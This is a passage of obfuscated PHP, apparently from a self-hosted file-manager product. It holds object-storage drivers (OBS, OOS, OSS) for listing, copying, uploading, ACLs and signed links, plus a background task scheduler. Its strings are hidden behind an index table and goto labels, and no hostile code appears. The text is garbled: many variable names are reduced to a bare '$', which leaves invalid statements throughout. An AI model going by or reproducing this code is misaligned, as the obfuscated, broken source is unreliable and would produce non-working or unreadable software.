=& $_SERVER[ܮ]; $ۑ = array($㎩޽[1968] => USER_ID, $㎩޽[573] => 0); $ތ؞ = $this->where($ۑ)->max($㎩޽[2204]); $ = array($㎩޽[2204] => $ތ؞ + 1); return $this->where($ۑ)->where(array($㎩޽[32] => $Θ))->save($); } private function getAutoName($) { $ =& $_SERVER[ܮ]; $ = array($[1968] => USER_ID, $[573] => 0); $ = $this->field($[32])->where($)->select(); $ = array_to_keyvalue($, $[12], $[32]); if (!$ || !in_array($, $)) { return $; } for ($ = 0; $ < count($); $++) { if (!in_array($ . "\50{$}\51", $)) { return $ . "\x28{$}\51"; } } return $ . "\50{$}\51"; } } goto A; d: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($Ɠ) { parent::__construct($Ɠ); $this->setSignVersion($_SERVER[ܮ][247]); } public function fileOutImage($, $ = 250) { $ =& $_SERVER[ܮ]; if ($this->size($) > 1024 * 1024 * 25) { return $this->fileOutImageServer($, $); } $ = array($[1668] => $[1669] . $ . $[1670]); $ = $this->link($, $); $this->fileOutLink($); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($؂) { parent::__construct($؂); $this->setSignVersion($_SERVER[ܮ][247]); } public function uploadFormData($, $і = 3600) { return $this->uploadFormDataV2($, $і); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($Ֆ) { parent::__construct(); include_once SDK_DIR . $_SERVER[ܮ][1671]; $this->_init($Ֆ); } public function _init($) { $ =& $_SERVER[ܮ]; $this->config = $; foreach ($ as $Ġ => $ŧ) { if (isset($this->{$Ġ})) { $this->{$Ġ} = $ŧ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($[1672] . LNG($[1673])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $è =& $_SERVER[ܮ]; $ = new OSS\Model\CorsConfig(); $ɱ偩 = new OSS\Model\CorsRule(); $ɱ偩->addAllowedOrigin($è[1674]); $ɱ偩->addAllowedMethod($è[1675]); $ɱ偩->addAllowedMethod($è[1676]); $ɱ偩->addAllowedMethod($è[1677]); $ɱ偩->addAllowedMethod($è[1678]); $ɱ偩->addAllowedMethod($è[162]); $ɱ偩->setMaxAgeSeconds(600); $ɱ偩->addExposeHeader($è[1679]); $ɱ偩->addAllowedHeader($è[1674]); $->addRule($ɱ偩); try { $this->client->putBucketCors($this->bucket, $); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $è[212] . $->getMessage()); return !1; } return !0; } public function getBucketCors() { $ =& $_SERVER[ܮ]; $۴ϡ = null; try { $۴ϡ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $[212] . $->getMessage()); return null; } if (!$۴ϡ || !($ = $۴ϡ->getRules())) { return null; } $ۉ = $[0]->getAllowedOrigins(); $ܘ = $[0]->getAllowedMethods(); $ = $[0]->getMaxAgeSeconds(); $锸 = $[0]->getExposeHeaders(); $ = $[0]->getAllowedHeaders(); return array($[218] => isset($ۉ[0]) ? $ۉ[0] : $[12], $[222] => $ܘ, $[1680] => $, $[1681] => isset($锸[0]) ? $锸[0] : $[12], $[219] => isset($[0]) ? $[0] : $[12]); } public function isBucketCors() { $ =& $_SERVER[ܮ]; $ = $this->getBucketCors(); if (!$ || !is_array($)) { return !1; } if ($[$[218]] != $[220] || $[$[219]] != $[220]) { return !1; } $ֹ = array_map($[221], $[$[222]]); if (!is_array($ֹ)) { $ֹ = array(); } $Գ׳ = array($[223], $[224], $[225], $[226], $[227]); $ = array_diff($Գ׳, $ֹ); return empty($); } public function mkfile($, $ʭ = '', $ށ = REPEAT_RENAME) { $ = $this->setContent($, $ʭ); if ($ !== !1) { return $this->getPathOuter($); } return !1; } public function mkdir($䂮, $慶 = REPEAT_SKIP) { if ($慶 && $this->_isFolder($䂮)) { return $this->getPathOuter($䂮); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($䂮)); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][212] . $->getMessage()); return !1; } return $this->getPathOuter($䂮); } private function fileList($, $ = '', $ћ = 0) { $ =& $_SERVER[ܮ]; $ = trim($, $[8]); $ɚɆ = empty($) && $ !== $[228] ? $[12] : $ . $[8]; $ = $[12]; $Օ = 1000; $ = $ˡ = array(); while (!0) { check_abort(); $ = array($[1682] => $, $[1683] => $ɚɆ, $[1684] => $Օ, $[1685] => $); try { $ɻ = $this->client->listObjects($this->bucket, $); } catch (OSS\Core\OssException $Ǧ) { $this->writeLog(__FUNCTION__ . $[212] . $Ǧ->getMessage()); break; } $ = $ɻ->getNextMarker(); $ = $ɻ->getObjectList(); $ƍ = $ɻ->getPrefixList(); foreach ($ as $翛) { if ($翛->getKey() == $ɚɆ) { continue; } $Ȼ = $翛->getKey(); $퉛 = $翛->getSize(); $ = $翛->getLastModified(); $ = trim($翛->getETag(), $[118]); $ƛ = $ћ ? array($[32] => $Ȼ, $[79] => $퉛, $[204] => strtotime($), $[1686] => $) : $Ȼ; $ǁ = $퉛 == 0 && substr($Ȼ, strlen($Ȼ) - 1, 1) == $[8] ? !0 : !1; $賉 = array($[79] => $퉛, $[1687] => $퉛, $[88] => strtotime($), $[1688] => $, $[1686] => $); $this->cacheMethodInfoSet($Ȼ, $ǁ, $賉); if ($ǁ) { $[] = $Ȼ; continue; } $ˡ[] = $ƛ; } foreach ($ƍ as $) { $[] = $->getPrefix(); $this->cacheMethodInfoSet($->getPrefix(), !0); } if ($ === $[12]) { break; } } $this->cacheMethodInfoSet($, !0); return array($[85] => $, $[86] => $ˡ); } public function listObject($, $ = '') { $ـ =& $_SERVER[ܮ]; $ = trim($, $ـ[8]); $ = empty($) && $ !== $ـ[228] ? $ـ[12] : $ . $ـ[8]; $ = $ـ[12]; $Ը = 1000; $ᨄ = $̩ = array(); while (!0) { check_abort(); $ = array($ـ[1682] => $, $ـ[1683] => $, $ـ[1684] => $Ը, $ـ[1685] => $); try { $ܟ = $this->client->listObjects($this->bucket, $); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $ـ[212] . $->getMessage()); break; } $ = $ܟ->getNextMarker(); $ﵚ = $ܟ->getObjectList(); foreach ($ﵚ as $Ŀ) { if ($Ŀ->getKey() == $) { continue; } $ = $Ŀ->getKey(); $ = $Ŀ->getSize(); $ʧ = $ == 0 && substr($, strlen($) - 1, 1) == $ـ[8] ? !0 : !1; if ($ʧ) { continue; } $̩[] = $ . $ـ[212] . $; } if ($ === $ـ[12]) { break; } } return array($ـ[85] => $ᨄ, $ـ[86] => $̩); } public function copyFile($, $) { $ = $this->size($); if ($ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $, $this->bucket, $this->pathEncode($)); } catch (OSS\Core\OssException $á) { $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][212] . $á->getMessage()); return !1; } return $this->getPathOuter($); } $Χ = $this->multiCopyObject($, $, $); return $Χ ? $this->getPathOuter($) : !1; } private function multiCopyObject($, $, $뻕) { $ٖܺ =& $_SERVER[ܮ]; try { $ = array(); if ($ = $this->hashMd5($)) { $ = array(OSS\OssClient::OSS_HEADERS => array($ٖܺ[1689] => $)); } $ܙް = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($), $); $Һ = 1; $ = 0; $Ս = array(); $Ď = 1024 * 1024 * 10; $ = $this->client->generateMultiuploadParts($뻕, $Ď); foreach ($ as $賒 => $׏) { $ = $ + (int) $׏[$ٖܺ[1690]]; $ = (int) $׏[$ٖܺ[412]] + $ - 1; $׆ = array($ٖܺ[164] => $, $ٖܺ[165] => $); $Ս[] = $this->client->uploadPartCopy($this->bucket, $, $this->bucket, $this->pathEncode($), $Һ, $ܙް, $׆); $Һ = $Һ + 1; } $ۓ = array(); foreach ($Ս as $賒 => $Ԩ) { $ۓ[] = array($ٖܺ[297] => $賒 + 1, $ٖܺ[298] => $Ԩ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($), $ܙް, $ۓ); } catch (OSS\Core\OssException $ݛ) { $this->writeLog(__FUNCTION__ . $ٖܺ[212] . $ݛ->getMessage()); return !1; } return !0; } public function moveFile($⹘, $㥽) { if ($this->copyFile($⹘, $㥽)) { $this->remove($⹘); return $this->getPathOuter($㥽); } return !1; } public function delFile($) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($)); } catch (OSS\Core\OssException $͐) { $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][212] . $͐->getMessage()); return !1; } return !0; } public function delFolder($ݱ) { $ٝ =& $_SERVER[ܮ]; if (!$this->exist($ݱ)) { return !0; } $this->listItemCache = !1; $ = $this->fileList($ݱ); $this->listItemCache = !0; $ӵ = trim($ݱ, $ٝ[8]) . $ٝ[8]; if (!empty($ݱ) && $ݱ !== $ٝ[228] && !in_array($ӵ, $[$ٝ[85]])) { $[$ٝ[85]][] = $ӵ; } $ڵ = $this->delByBatch($[$ٝ[86]]); if (!$ڵ) { return !1; } $ڵ = $this->delByBatch($[$ٝ[85]]); if (!$ڵ) { return !1; } return $this->delFile($ӵ); } private function delByBatch($ɮ) { foreach (array_chunk($ɮ, 1000) as $) { try { $this->client->deleteObjects($this->bucket, $); } catch (OSS\Core\OssException $２) { $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][212] . $２->getMessage()); return !1; } } return !0; } public function rename($񚻓, $) { return $this->renameObject($񚻓, $); } private function fileInfo($됆, $Ǵ̮ = false, $Ԝ = array()) { $籅 =& $_SERVER[ܮ]; $ = array($籅[32] => $this->pathThis($됆), $籅[87] => $this->getPathOuter($됆), $籅[33] => $籅[230], $籅[79] => isset($Ԝ[$籅[79]]) ? $Ԝ[$籅[79]] : 0, $籅[166] => $this->ext($됆)); if ($Ǵ̮) { return $; } $[$籅[231]] = $[$籅[88]] = 0; $[$籅[232]] = $[$籅[233]] = !0; if (empty($Ԝ)) { $ˆ = $this->objectMeta($됆); if (!$ˆ) { return $; } $Ԝ = array($籅[88] => strtotime($ˆ[$籅[1688]]), $籅[79] => $ˆ[$籅[1687]] + 0, $籅[1686] => $ˆ[$籅[1686]]); } if (isset($Ԝ[$籅[1686]]) && $Ԝ[$籅[1686]]) { $[$籅[235]] = trim($Ԝ[$籅[1686]], $籅[118]); } if (isset($Ԝ[$籅[79]])) { $[$籅[79]] = $Ԝ[$籅[79]]; } if (isset($Ԝ[$籅[88]])) { $[$籅[88]] = $Ԝ[$籅[88]]; } if (isset($Ԝ[$籅[204]]) && !trim($[$籅[88]])) { $[$籅[88]] = $Ԝ[$籅[204]]; } return $; } private function folderInfo($ʏ, $󭅼 = false, $˰ = array()) { $䜤 =& $_SERVER[ܮ]; $煸 = array($䜤[32] => $this->pathThis($ʏ), $䜤[87] => $this->getPathOuter($䜤[8] . $ʏ), $䜤[33] => $䜤[78]); if ($󭅼) { return $煸; } $煸[$䜤[231]] = $煸[$䜤[88]] = 0; $煸[$䜤[232]] = $煸[$䜤[233]] = !0; if (empty($˰)) { $ʏ = rtrim($ʏ, $䜤[8]) . $䜤[8]; $󈧂 = $this->objectMeta($ʏ); if (!$󈧂) { return $煸; } $˰ = array($䜤[231] => $󈧂[$䜤[595]][$䜤[1691]], $䜤[88] => strtotime($󈧂[$䜤[1688]])); } if (isset($˰[$䜤[88]])) { $煸[$䜤[88]] = $˰[$䜤[88]]; } if (isset($˰[$䜤[231]])) { $煸[$䜤[231]] = $˰[$䜤[231]]; } return $煸; } public function listPath($瞻, $ʽ = false) { $ߌȨ =& $_SERVER[ܮ]; $ = $this->fileList($瞻, $ߌȨ[8], !0); foreach ($[$ߌȨ[85]] as $㙵ܝ => $) { $[$ߌȨ[85]][$㙵ܝ] = $this->folderInfo($, $ʽ, $); } foreach ($[$ߌȨ[86]] as $㙵ܝ => $) { $[$ߌȨ[86]][$㙵ܝ] = $this->fileInfo($[$ߌȨ[32]], $ʽ, $); } return $; } protected function infoChildren($ط٢, &$֊) { $ =& $_SERVER[ܮ]; $Ӈ = $this->fileList($ط٢, $[12], !0); $֊[$[81]] += count($Ӈ[$[85]]); $֊[$[80]] += count($Ӈ[$[86]]); foreach ($Ӈ[$[86]] as $ԋ) { if (!$ԋ || !$ԋ[$[79]]) { continue; } $֊[$[79]] += $ԋ[$[79]]; } } public function has($ᄹ, $ = false, $׵ = true) { $̥ =& $_SERVER[ܮ]; $ᄹ = trim($ᄹ, $̥[8]); $ = empty($ᄹ) && $ᄹ !== $̥[228] ? $̥[12] : $ᄹ . $̥[8]; $П = $̥[12]; $ʻ = 500; $Ԃ = $Ւ = 0; while (!0) { check_abort(); $Ѝ = array($̥[1682] => $̥[8], $̥[1683] => $, $̥[1684] => $ʻ, $̥[1685] => $П); try { $ = $this->client->listObjects($this->bucket, $Ѝ); } catch (OSS\Core\OssException $ٕ) { $this->writeLog(__FUNCTION__ . $̥[212] . $ٕ->getMessage()); break; } $П = $->getNextMarker(); $ޛ = $->getObjectList(); $š = $->getPrefixList(); if ($) { if (count($ޛ) > 1 || count($ޛ) == 1 && $ޛ[0]->getKey() != $) { $Ԃ += count($ޛ) - 1; } if (!empty($š)) { $Ւ += count($š); } if ($П === $̥[12]) { break; } continue; } if ($׵) { if (!empty($ޛ)) { if (count($ޛ) > 1 || $ޛ[0]->getKey() != $) { return !0; } } } else { if (!empty($š)) { return !0; } } if ($П === $̥[12]) { break; } } if ($) { return array($̥[239] => $Ԃ, $̥[240] => $Ւ); } return !1; } public function listAll($) { $壢 =& $_SERVER[ܮ]; $Ì = $this->fileList($, $壢[12], !0); $ = array_to_keyvalue($Ì[$壢[86]], $壢[32]); foreach ($Ì[$壢[85]] as $Ҙ) { if (is_string($Ҙ)) { $[$Ҙ] = array($壢[79] => 0); } } return $this->listAllFiles($, $); } public function canRead($) { $ =& $_SERVER[ܮ]; $¦؄ = $this->pathAcl($); return $¦؄ == $[1692] || $¦؄ == $[642] ? !0 : !1; } public function canWrite($ǣ) { $ = $this->pathAcl($ǣ); return $ == $_SERVER[ܮ][642] ? !0 : !1; } public function pathAcl($؅) { $ =& $_SERVER[ܮ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ف = $this->client->getObjectAcl($this->bucket, $this->pathEncode($؅)); } catch (OSS\Core\OssException $魑) { $this->writeLog(__FUNCTION__ . $[212] . $魑->getMessage()); return !1; } $ = $ف == $[37] ? $this->bucketAcl : $ف; if ($ == $[1693]) { return $[1692]; } if ($ == $[1694]) { return $[642]; } return $; } private function chmodPath($،, $ = '') { $ʙ  =& $_SERVER[ܮ]; $ = empty($) ? $ʙ [1694] : $; $Ӡ = array($ʙ [37], $ʙ [229], $ʙ [1693], $ʙ [1694]); if (!in_array($, $Ӡ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($،), $); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $ʙ [212] . $->getMessage()); return !1; } return !0; } public function getContent($ׄ) { return $this->fileSubstr($ׄ, -1); } public function setContent($Ű, $ = '') { $ =& $_SERVER[ܮ]; try { $ډ = $this->trafficLimit($[1695]); $ = $this->client->putObject($this->bucket, $this->pathEncode($Ű), $, $ډ); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $[212] . $->getMessage()); return !1; } $ӥ = array($[1689] => trim($[$[1686]], $[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ű))); $this->updateObjMeta($Ű, $ӥ); return isset($[$[1696]][$[294]]) ? !0 : !1; } private function updateObjMeta($ǌ, $җ) { $ǌ = $this->pathEncode($ǌ); try { $ = array(OSS\OssClient::OSS_HEADERS => $җ); $this->client->copyObject($this->bucket, $ǌ, $this->bucket, $ǌ, $); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][212] . $->getMessage()); return !1; } return !0; } public function upload($ʰ, $, $ڈ = false, $ߏ = REPEAT_REPLACE) { $ =& $_SERVER[ܮ]; if (!$ || !@file_exists($)) { return !1; } $܄ = trim($ʰ, $[8]); $ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($[1689] => @md5_file($)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ʰ))); $ = $this->trafficLimit($[1695], $); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($܄), $, $); } catch (OSS\Core\OssException $ݯ) { $this->writeLog(__FUNCTION__ . $[212] . $ݯ->getMessage()); return !1; } return $this->getPathOuter($ʰ); } public function getHost() { $歁 =& $_SERVER[ܮ]; $ = explode($歁[208], parent::getHost()); return $[0] . $歁[208] . $this->bucket . $歁[10] . $[1]; } public function uploadFormData($, $ɢ쮸 = 3600) { $Ѭ =& $_SERVER[ܮ]; if (!($곜 = $this->getHost())) { return !1; } $簡 = $ɢ쮸; $Ԙг = date($Ѭ[1697], time() + $簡); $ = new DateTime($Ԙг); $ˌ = $->format(DateTime::ISO8601); $룛 = strpos($ˌ, $Ѭ[371]); $ˌ = substr($ˌ, 0, $룛) . $Ѭ[1698]; $޶ = 1048576000 * 5; $ě = $this->pathFather($); $ڼ = array($Ѭ[262] => $ˌ, $Ѭ[265] => array(array($Ѭ[1699], 0, $޶), array($Ѭ[267], $Ѭ[268], $ě))); $ƾɱ = base64_encode(json_encode($ڼ)); $ = base64_encode(hash_hmac($Ѭ[1525], $ƾɱ, $this->secret, !0)); $ԕς = array($Ѭ[1700] => $this->accessKey, $Ѭ[277] => $ƾɱ, $Ѭ[270] => $Ѭ[261], $Ѭ[1701] => $, $Ѭ[206] => $곜); $ԕς = $this->trafficLimit($Ѭ[1695], $ԕς, !0); return $ԕς; } public function uploadMultiData($, $İǾ = 3600) { $񡌨 =& $_SERVER[ܮ]; if (!($ = $this->getHost())) { return !1; } $Ƴ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($)); return array($񡌨[281] => $Ƴ, $񡌨[206] => $ . $񡌨[8] . $this->pathEncode($), $񡌨[282] => gmdate($񡌨[1702]), $񡌨[95] => $); } public function uploadMultiAuth($Ȑ, $ƍ = array()) { if (isset($ƍ[$_SERVER[ܮ][283]])) { return $this->uploadPartAuth($Ȑ, $ƍ); } return $this->uploadListAuth($Ȑ, $ƍ); } private function uploadPartAuth($˺, $㵽 = array()) { $Ãՙ =& $_SERVER[ܮ]; $êǤ = $㵽[$Ãՙ[95]]; $֦ = $this->_getUploadAuth($êǤ, $㵽); $₸ = array($Ãՙ[286] => $֦[$Ãՙ[286]], $Ãՙ[282] => $֦[$Ãՙ[282]]); if (isset($֦[$Ãՙ[1703]])) { $₸[$Ãՙ[1703]] = $֦[$Ãՙ[1703]]; } return $₸; } private function uploadListAuth($ȭ, $ = array()) { $됰 =& $_SERVER[ܮ]; $ = $[$됰[95]]; $ = $[$됰[281]]; $ܠ = $this->client->listParts($this->bucket, $this->pathEncode($), $); $ꆀ = $ܠ->getListPart(); $ = array(); foreach ($ꆀ as $̐) { $[] = array($됰[297] => $̐->getPartNumber(), $됰[298] => trim($̐->getETag(), $됰[118])); } if (!$) { return !1; } $ = $this->_getUploadAuth($, $); return array($됰[286] => $[$됰[286]], $됰[282] => $[$됰[282]], $됰[289] => $); } private function _getUploadAuth($ߠ, $ߍ) { $ =& $_SERVER[ܮ]; $ځ = gmdate($[1702]); $ = isset($ߍ[$[283]]) ? $[253] : $[288]; $Ѥ = array_intersect_key($ߍ, array_flip(array($[283], $[281]))); ksort($Ѥ); $ĸ = $Ѥ ? $[76] . http_build_query($Ѥ, null, $[284], PHP_QUERY_RFC3986) : $[12]; $ = array($, $[12], $[120], $ځ, "\170\x2d\x6f\163\x73\x2d\x64\141\x74\145\x3a{$ځ}", $[8] . $this->bucket . $[8] . $ߠ . $ĸ); if (isset($ߍ[$[283]])) { $ = $this->trafficLimit($[1695], array(), !0); if ($) { $ߠ = $[1703]; array_splice($, 5, 0, $ߠ . $[4] . $[$ߠ]); } } $ = implode($[285], $); $􈁙 = base64_encode(hash_hmac($[1525], $, $this->secret, !0)); $Ĵ = $[1672] . $this->accessKey . $[4] . $􈁙; $ể = array($[286] => $Ĵ, $[282] => $ځ); if (!empty($)) { $ể = array_merge($ể, $); } return $ể; } public function download($, $ޤÃ) { $ =& $_SERVER[ܮ]; if ($this->isFolder($)) { return !1; } try { $ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ޤÃ); $ = $this->trafficLimit($[109], $); $this->client->getObject($this->bucket, $this->pathEncode($), $); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $[212] . $->getMessage()); return !1; } return $ޤÃ; } public function fileSubstr($, $ = 0, $ = false) { if ($ === -1) { $؅ = array(); } else { if ($ === !1) { $ = $this->size($); } else { $ = $ + $ - 1; } $؅ = array(OSS\OssClient::OSS_RANGE => "{$}\55{$}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($), $؅); } catch (OSS\Core\OssException $) { $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][212] . $->getMessage()); think_exception($->getMessage()); return !1; } } private function trafficLimit($գ, $ = array(), $ٷ = false) { $ =& $_SERVER[ܮ]; if ($գ == $[1695] && $this->isUploadServer() || $գ == $[109] && $this->isFileOutServer()) { return $; } $в = floatval($GLOBALS[$[6]][$[92]][$[107]][$գ]) * 1024 * 1024 * 8; if (!$в) { return $; } $в = $в < 819200 ? 819200 : ($в > 838860800 ? 838860800 : $в); if ($ٷ) { $[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($в); } else { if (!isset($[OSS\OssClient::OSS_HEADERS])) { $[OSS\OssClient::OSS_HEADERS] = array(); } $[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($в); } return $; } public function link($׳, $ = array()) { $՞惝 =& $_SERVER[ܮ]; if (!$this->exist($׳) || $this->isFolder($׳)) { return !1; } try { $ = $this->trafficLimit($՞惝[109], $, !0); $ = $this->client->signUrl($this->bucket, $this->pathEncode($׳), 3600 * 12, $՞惝[1606], $); return $this->getCdnLink($); } catch (OSS\Core\OssException $̯) { $this->writeLog(__FUNCTION__ . $՞惝[212] . $̯->getMessage()); return !1; } } public function fileOut($, $ɐ = false, $ = false, $ڐ = '') { $Ȟ =& $_SERVER[ܮ]; if ($this->isFileOutServer()) { return $this->fileOutServer($, $ɐ, $, $ڐ); } if (!$) { $ = $this->pathThis($); } $ = rawurlencode($); $ޥ = get_file_mime(get_path_ext($)); if ($ޥ == $Ȟ[248]) { return parent::fileOut($, $ɐ, $, $ڐ); } $ɐ = $ɐ ? $Ȟ[1704] : $Ȟ[1705]; $ݝĆ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Ȟ[1706] . rawurlencode("{$ɐ}\73\146\x69\x6c\x65\156\x61\155\x65\75{$}")); $Ь = $this->link($, $ݝĆ); $this->fileOutLink($Ь); } public function fileOutServer($ɕπ, $쇴 = false, $Đ = false, $ = '') { parent::fileOut($ɕπ, $쇴, $Đ, $); } public function fileOutImage($, $ = 250) { if ($this->size($) > 1024 * 1024 * 20) { return $this->fileOutImageServer($, $); } $ǋ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ܮ][1669] . $); $݆ = $this->link($, $ǋ); $this->fileOutLink($݆); } public function fileOutImageServer($ٟ˟, $ = 250) { parent::fileOutImage($ٟ˟, $); } public function fileOutLink($ӽ) { $ =& $_SERVER[ܮ]; if (!$this->isCdnHost() && substr($ӽ, 0, 7) == $[216]) { $ӽ = $[217] . substr($ӽ, 7); } header($[172] . $ӽ); die; } public function hashMd5($Ò, $ = '') { $ʚװ =& $_SERVER[ܮ]; $ = $this->_objectMeta($Ò); if (!$) { return $ʚװ[12]; } if (!isset($[$ʚװ[1689]]) && !empty($)) { $Λ = $this->updateObjMeta($Ò, array($ʚװ[1689] => $)); $[$ʚװ[1689]] = $Λ ? $ : $ʚװ[12]; } return isset($[$ʚװ[1689]]) ? strtolower($[$ʚװ[1689]]) : $ʚװ[12]; } public function size($娆) { $׍ = $this->objectMeta($娆); return $׍ ? $׍[$_SERVER[ܮ][79]] : 0; } public function info($Țꎘ) { if ($this->isFolder($Țꎘ)) { return $this->folderInfo($Țꎘ); } else { if ($this->isFile($Țꎘ)) { return $this->fileInfo($Țꎘ); } } return !1; } public function exist($ލ) { return $this->isFile($ލ) || $this->isFolder($ލ); } public function isFile($ۦ) { return !$this->isFolder($ۦ) && $this->objectMeta($ۦ); } public function isFolder($Ј) { return $this->cacheMethod($_SERVER[ܮ][177], $Ј); } protected function objectMeta($) { return $this->cacheMethod($_SERVER[ܮ][179], $); } protected function _objectMeta($گ) { $ =& $_SERVER[ܮ]; try { $ؘ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($گ)); } catch (OSS\Core\OssException $ݠ) { $this->writeLog(__FUNCTION__ . $[212] . $ݠ->getMessage()); $ؘ = !1; } if ($ؘ) { $ؘ[$[79]] = intval($ؘ[$[1687]]); } return $ؘ; } protected function _isFolder($Ȁِ) { $ =& $_SERVER[ܮ]; if ($Ȁِ == $[12] || $Ȁِ == $[8]) { return !0; } $ = array($[1682] => $[8], $[1683] => rtrim($Ȁِ, $[8]) . $[8], $[1684] => 1, $[1685] => $[12]); $Ơ = $this->client->listObjects($this->bucket, $); if ($Ơ->getObjectList() || $Ơ->getPrefixList()) { return !0; } return !1; } public function writeLog($ = '', $ = false) { $ =& $_SERVER[ܮ]; $̱ = in_array(ACTION, array($[210], $[211])); if (!$̱ && !GLOBAL_DEBUG) { return; } $ꄕ = 0; if (stripos($, $[1707]) !== !1) { $ꄕ = 1; $ķ = explode($[1708], $); $ = !empty($ķ[1]) ? $ķ[1] : $; } else { if (stripos($, $[1709])) { $ꄕ = 2; $ķ = explode($[1709], $); $ķ = explode($[4], $ķ[0]); $ = !empty($ķ[1]) ? $ķ[1] : $; } } if ($̱ && I18n::getType() == $[1710]) { if ($ꄕ == 1) { $ = str_replace($[1711], $[1712], $); } else { if ($ꄕ == 2) { $ķ = explode($[212], $ķ[0]); $у = isset($ķ[1]) ? $ķ[1] : $[12]; $ʼ = array($[1713] => $[1714], $[1715] => $[1716], $[1717] => $[1718], $[1719] => $[1720], $[1721] => $[1722], $[1723] => $[1724], $[1725] => $[1726], $[1727] => $[1728], $[1729] => $[1730], $[1731] => $[1732]); if (isset($ʼ[$у])) { $ = $ʼ[$у]; } } } if (stripos($, $[1733])) { $ = $[1734]; } } if (!trim($)) { return; } parent::writeLog(trim($), $); } } goto A㶣; dޯ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $瀲 =& $_SERVER[ܮ]; if (self::valueGet($瀲[848]) != $瀲[91]) { return; } if (self::valueGet($瀲[945]) == $瀲[91]) { $ = self::valueGet($瀲[1928]); if (time() - $ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($瀲[945], $瀲[91]); self::log($瀲[1929] . ACTION . $瀲[1930]); Hook::bind($瀲[1931], $瀲[1932]); $ = 0; while (!0) { self::cacheClear(); if (self::valueGet($瀲[848]) != $瀲[91]) { self::valueSet($瀲[945], $瀲[228]); self::log($瀲[1933]); die; } $ԏʵ = time(); if ($ԏʵ - $ >= 60) { self::valueSet(array($瀲[945] => $瀲[91], $瀲[1928] => $ԏʵ)); $ = $ԏʵ; } if (!file_exists(USER_SYSTEM . $瀲[1934])) { self::valueSet(array($瀲[945] => $瀲[228], $瀲[848] => $瀲[228])); self::log($瀲[1935]); die; } $ = file_get_contents(BASIC_PATH . $瀲[1936]); $ܐ = KOD_VERSION . $瀲[10] . KOD_VERSION_BUILD; $Ǻ = match_text($, $瀲[1937]) . $瀲[10] . match_text($, $瀲[1938]); if ($Ǻ != $ܐ) { self::restart(); self::log("\163\164\x6f\160\x65\x64\x2e\x5b\x76\145\162\163\x69\x6f\x6e\40\x75\x70\x64\x61\164\x65\73{$versionNow}\x20\75\76\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ =& $_SERVER[ܮ]; http_close(); $GLOBALS[$[1939]] = 1; $_SERVER[$[1940]] = $[1941]; $_COOKIE = array(); $GLOBALS[$[1942]] = 1; $GLOBALS[$[1943]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Ӏ =& $_SERVER[ܮ]; http_close(); self::valueSet($Ӏ[848], $Ӏ[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Ӏ[945] => $Ӏ[228], $Ӏ[848] => $Ӏ[91])); self::log($Ӏ[1944]); } public static function taskSwitch() { $ț =& $_SERVER[ܮ]; $ݰ = self::valueGet($ț[848]) == $ț[91] ? $ț[228] : $ț[91]; self::valueSet($ț[848], $ݰ); } public static function shutdownEvent() { $ǎ =& $_SERVER[ܮ]; self::valueSet($ǎ[945], $ǎ[228]); self::log($ǎ[1945]); } public static function config($ߺ, $˙) { self::valueSet($_SERVER[ܮ][848], $ߺ); } private static function taskRunAll() { $濐 =& $_SERVER[ܮ]; $ = timeFloat(); $ڹ = Model($濐[1946])->listData(); $ă = count($ڹ); for ($钏 = 0; $钏 < $ă; $钏++) { $ = $ڹ[$钏]; if (!$[$濐[487]] || $[$濐[1947]] != $濐[91]) { continue; } if (!self::taskTimeCheck($)) { continue; } self::taskRun($); } Hook::trigger($濐[1948]); self::taskQueueRun($); } 